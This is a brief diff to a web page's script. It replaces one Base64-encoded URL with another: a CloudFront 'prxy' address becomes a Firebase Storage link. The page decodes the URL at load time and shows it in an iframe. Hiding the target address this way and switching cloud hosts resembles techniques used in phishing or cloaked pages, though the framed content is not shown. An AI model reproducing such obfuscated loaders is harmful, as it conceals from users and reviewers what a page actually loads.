@@ -92,7 +92,7 @@ iframe {
 
 <script>
 // Decodifica a URL Base64 e cria o iframe
-const encoded = "aHR0cHM6Ly9kZnMzcnpxNDR2NmFzLmNsb3VkZnJvbnQubmV0Lz9mcmFtZT1mdWxsc2NyZWVuLyMvcHJ4eQ==";
+const encoded = "aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9teS1maXJzdC1wcm9qZWN0LTVkMzJkLmFwcHNwb3QuY29tL28vMTc2MDg4OTU2OTE4OD9hbHQ9bWVkaWEmdG9rZW49NTljNzU4OWUtZmI2ZC00OWVkLWI4MDQtY2QxN2JkZTU4MmYx";
 const url = atob(encoded);
 const iframe = document.createElement("iframe");
 iframe.src = url;
